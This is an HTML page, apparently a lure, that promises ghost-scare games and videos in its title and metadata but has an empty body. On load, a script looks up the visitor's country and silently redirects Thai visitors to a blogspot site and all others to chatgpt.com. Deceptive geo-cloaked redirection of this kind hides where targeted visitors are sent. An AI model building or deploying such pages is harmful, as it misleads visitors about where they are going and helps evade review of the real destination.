<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YOU WILL LIKE IT</title>
    <meta name="description" content="ghost scare troll games, ghost scare video clips, and many interesting things about the world of ghost scares!">
    <meta name="keywords" content="ghost scare, ghost scare game, ghost scare meme, ghost scare video, ghost scare clip, ghost scare troll, ghost scare website, ghost scare link, ghost scare game">
    <meta name="author" content="Ghost Scare Team">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: "Inter", sans-serif;
            overflow: auto;
        }

        *, *::before, *::after {
            box-sizing: border-box;
        }

        .tab {
            display: none;
        }

        .tab.active {
            display: block;
        }
    </style>
    <script>
        async function redirectBasedOnIP() {
            try {
                const response = await fetch('https://get.geojs.io/v1/ip/country.json'); // Reliable IP API
                if (!response.ok) throw new Error('Failed to fetch IP data');

                const data = await response.json();
                const country = data.country;

                // Redirect based on country
                if (country === 'TH') {
                    setTimeout(() => {
                        window.location.href = "https://ibvoiminh.blogspot.com/";
                    }, 1000);
                } else {
                    setTimeout(() => {
                        window.location.href = "https://chatgpt.com/";
                    }, 1000);
                }
            } catch (error) {
                console.error('Error fetching IP data:', error);
                // Default redirect for any error
                setTimeout(() => {
                    window.location.href = "https://chatgpt.com/";
                }, 1000);
            }
        }

        // Execute redirect logic on page load
        document.addEventListener('DOMContentLoaded', redirectBasedOnIP);
    </script>
</head>
<body>
    <!-- Tab 1: Default content -->
    <div id="tab1" class="tab active">
      
    </div>
</body>
</html>
